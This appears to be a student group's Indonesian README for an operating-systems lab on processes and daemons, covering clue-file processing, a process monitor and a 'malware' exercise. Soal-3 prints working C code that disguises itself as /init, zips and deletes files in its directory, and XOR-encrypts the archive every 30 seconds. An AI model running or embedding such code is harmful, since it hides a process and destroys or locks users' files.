# Sisop-2-2025-IT12

### Soal Modul 2 Sistem Operasi 2025

## Anggota
| Nama                            | NRP        |
|---------------------------------|------------|
| Nadia Kirana Afifah Prahandita  | 5027241005 |
| Hansen Chang                    | 5027241028 |
| Muhammad Khosyi Syehab          | 5027241089 |

## PENJELASAN

## Soal-1
A. Downloading the Clues

pertama kita perlu membuat file cpp bernama ``action.cpp``, kemudian kita siapkan library yang akan dipakai, seperti ``stdlib.h``, ``<sys/stat.h>``, ``unistd.h``, dll. Lalu kita pastikan apakah directory ``Clues`` sudah ada, jika belum ada maka download file ``Clues.zip`` dan unzip ke folder ``Clues`` serta hapus file .zip sebelumnya. Jika sudah ada maka tidak perlu download ``Clues.zip`` lagi.
```
bool directory_exists(const char *path) {
    struct stat st;
    return (stat(path, &st) == 0 && S_ISDIR(st.st_mode));
}
void download_and_extract() {
    if (directory_exists(CLUES_DIR)) {
        printf("Folder '%s' sudah ada king\n", CLUES_DIR);
        return;
    }
    printf("Mendownload '%s'\n", ZIP_FILE);
    char *wget_args[] = {"wget", "-qO", ZIP_FILE, (char *)ZIP_URL, NULL};
    run_command("wget", wget_args);

    printf("Mengekstrak '%s'....\n", ZIP_FILE);
    char *unzip_args[] = {"unzip", "-q", ZIP_FILE, NULL};
    run_command("unzip", unzip_args);

    if (unlink(ZIP_FILE) != 0) {
        fprintf(stderr, "Tidak bisa menghapus '%s'.\n", ZIP_FILE);
    }
    printf("Done sir, Folder '%s' resdy to launch\n", CLUES_DIR);
    }
```
B. Filtering the Files

```
bool is_valid_filename(const char *filename) {
    regex_t regex;
    int result;

    result = regcomp(&regex, "^[a-zA-Z0-9]\\.txt$", REG_EXTENDED);
    if (result) return false;

    result = regexec(&regex, filename, 0, NULL, 0);
    regfree(&regex);

    return (result == 0);
}

void filter_files() {
    const char *subdirs[] = {
        "Clues/ClueA", "Clues/ClueB", "Clues/ClueC", "Clues/ClueD"
    };

    if (!directory_exists(FILTER_DIR)) {
        mkdir(FILTER_DIR, 0755);
    }

    for (int i = 0; i < 4; ++i) {
        DIR *dir = opendir(subdirs[i]);
        if (!dir) continue;

        struct dirent *entry;
        char src_path[512];
        char dest_path[512];
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG) {
                const char *fname = entry->d_name;
                snprintf(src_path, sizeof(src_path), "%s/%s", subdirs[i], fname);

                if (is_valid_filename(fname)) {
                    snprintf(dest_path, sizeof(dest_path), "%s/%s", FILTER_DIR, fname);
                    rename(src_path, dest_path);
                } else {
                    unlink(src_path);
                }
            }
        }
        closedir(dir);
    }
    printf("Filtering selesai. Silahkan cek folder '%s'\n", FILTER_DIR);
    }

```
C. Combine the File Content

```
void combine_files() {
    DIR *dir = opendir(FILTER_DIR);
    if (!dir) {
        perror("Gagal membuka folder Filtered");
        return;
    }

    struct dirent *entry;
    char *angka_files[100], *huruf_files[100];
    int angka_count = 0, huruf_count = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".txt")) {
            if (isdigit(entry->d_name[0])) {
                angka_files[angka_count++] = strdup(entry->d_name);
            } else if (isalpha(entry->d_name[0])) {
                huruf_files[huruf_count++] = strdup(entry->d_name);
            }
        }
    }
    closedir(dir);

    qsort(angka_files, angka_count, sizeof(char *), compare_names);
    qsort(huruf_files, huruf_count, sizeof(char *), compare_names);
    FILE *combined = fopen("Combined.txt", "w");
    if (!combined) {
        perror("Tidak bisa membuka Combined.txt");
        return;
    }

    int a = 0, h = 0;
    while (a < angka_count || h < huruf_count) {
        if (a < angka_count) {
            char filepath[512];
            snprintf(filepath, sizeof(filepath), "%s/%s", FILTER_DIR, angka_files[a]);
            FILE *src = fopen(filepath, "r");
            if (src) {
                char ch;
                while ((ch = fgetc(src)) != EOF) {
                    fputc(ch, combined);
                }
                fclose(src);
                unlink(filepath);
            }
            free(angka_files[a]);
            a++;
        }
        if (h < huruf_count) {
            char filepath[512];
            snprintf(filepath, sizeof(filepath), "%s/%s", FILTER_DIR, huruf_files[h]);
            FILE *src = fopen(filepath, "r");
            if (src) {
                char ch;
                while ((ch = fgetc(src)) != EOF) {
                    fputc(ch, combined);
                }
                fclose(src);
                unlink(filepath);
            }
            free(huruf_files[h]);
            h++;
        }
    }
    fclose(combined);
    printf("Done capt, semua file telah digabung ke Combined.txt\n");
    }
```

D. Decode the file

```
void decode_file() {
    FILE *src = fopen("Combined.txt", "r");
    if (!src) {
        perror("Tidak bisa membuka Combined.txt");
        return;
    }
    FILE *dest = fopen("Decoded.txt", "w");
    if (!dest) {
        perror("Tidak bisa membuat Decoded.txt");
        fclose(src);
        return;
    }
    char ch;
    while ((ch = fgetc(src)) != EOF) {
        if ((ch >= 'A' && ch <= 'Z')) {
            ch = ((ch - 'A' + 13) % 26) + 'A';
        } else if ((ch >= 'a' && ch <= 'z')) {
            ch = ((ch - 'a' + 13) % 26) + 'a';
        }
        fputc(ch, dest);
    }
    fclose(src);
    fclose(dest);
    printf("Your pass is ready sir\n");
    }
```

E. Password Check

nah, berdasarkan decode menggunakan ROT13 didapatkan passwordnya yaitu [password](assets/asa.png)

eh [realpassfr](123.png) lalu kita masukkan ke dalam [sini🐉](https://dragon-pw-checker.vercel.app/).

Done sir ^^

## Soal-2
## Soal-3
Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init.
```
// Rename proses ke /init
void rename_process(int argc, char *argv[], const char *new_name) {
    strncpy(argv[0], new_name, strlen(argv[0]));
    for (int i = 1; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
}

// XOR Enkripsi file
void xor_encrypt(const char *filepath, const char *outpath, unsigned char key, time_t t) {
    FILE *in = fopen(filepath, "rb");
    FILE *out = fopen(outpath, "wb");
    if (!in || !out) return;

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key ^ (t % 256), out);
    }

    fclose(in);
    fclose(out);
}

// Fungsi utama anak orphan
void zip_and_encrypt(const char *self_name) {
    time_t now = time(NULL);
    char zip_name[256], enc_name[256];
    sprintf(zip_name, "backup_%ld.zip", now);
    sprintf(enc_name, "backup_%ld.enc", now);

    pid_t pid = fork();
    if (pid == 0) {
        // Proses anak untuk menjalankan zip dengan execvp
        char *args[] = {
            "zip", "-rm", zip_name, "*", "-x", (char *)self_name, NULL
        };
        execvp("zip", args);
        exit(EXIT_FAILURE); // Kalau exec gagal
    } else if (pid > 0) {
        wait(NULL); // Tunggu sampai zip selesai
    } else {
        return; // Fork gagal
    }

    xor_encrypt(zip_name, enc_name, KEY, now);
    remove(zip_name);
}

int main(int argc, char *argv[]) {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent pertama keluar

    umask(0);
    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);
    if ((chdir(".")) < 0) exit(EXIT_FAILURE); // Gunakan current directory

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    rename_process(argc, argv, "/init");

    // Fork kedua → buat child orphan
    pid_t child_pid = fork();
    if (child_pid < 0) exit(EXIT_FAILURE);
    if (child_pid > 0) exit(EXIT_SUCCESS); // Parent keluar → child orphan

    // Orphan child
    char self_path[256];
    readlink("/proc/self/exe", self_path, sizeof(self_path));
    self_path[sizeof(self_path) - 1] = '\0';

    // Ambil hanya nama file dari path-nya
    char *self_name = strrchr(self_path, '/');
    self_name = (self_name != NULL) ? self_name + 1 : self_path;

    while (1) {
        zip_and_encrypt(self_name);
        sleep(30);
    }

    return 0;
}

```
## Soal-4
A. Menampilkan daftar semua proses yang sedang berjalan pada user tersebut beserta PID, command, CPU usage, dan memory usage.

./debugmon list <user>
```
if (argc == 3 && strcmp(argv[1], "list") == 0) {
    ...
    printf("PID: %-6d CMD: %-20s CPU: %.2f%% MEM: %.2f KB\n", pid, comm, 0.0, mem_usage);
}
```

B. Memasang mata-mata dalam mode daemon agar Debugmon terus memantau user secara otomatis &  dan melakukan pencatatan ke dalam file log dengan menjalankan: 

./debugmon daemon <user> & cat debugmon.log
```
else if (argc == 3 && strcmp(argv[1], "daemon") == 0) {
    daemonize();
    monitor_user_processes_daemon(argv[2], 0);
}
```

C. Menghentikan pengawasan.

./debugmon stop <user>
```
else if (argc == 3 && strcmp(argv[1], "stop") == 0) {
    stop_debugmon_daemon_only(argv[2]);
}
```

D. Menggagalkan semua proses user yang sedang berjalan & user juga tidak bisa menjalankan proses lain dalam mode ini.

./debugmon fail <user>
```
else if (argc == 3 && strcmp(argv[1], "fail") == 0) {
    daemonize();
    monitor_user_processes_daemon(argv[2], 1);
}
```
```
if (fail_mode) {
    if (kill(pid, SIGKILL) == 0) {
        log_failed_process(comm); // mencatat _FAILED
    }
}
```

E. Mengizinkan user untuk kembali menjalankan proses.

./debugmon revert <user>
```
else if (argc == 3 && strcmp(argv[1], "revert") == 0) {
    stop_debugmon_daemon_only(argv[2]);
}
```

F. Mencatat ke dalam file log.
```
void log_process(...) { fprintf(... "_RUNNING"); }
void log_failed_process(...) { fprintf(... "_FAILED"); }
```





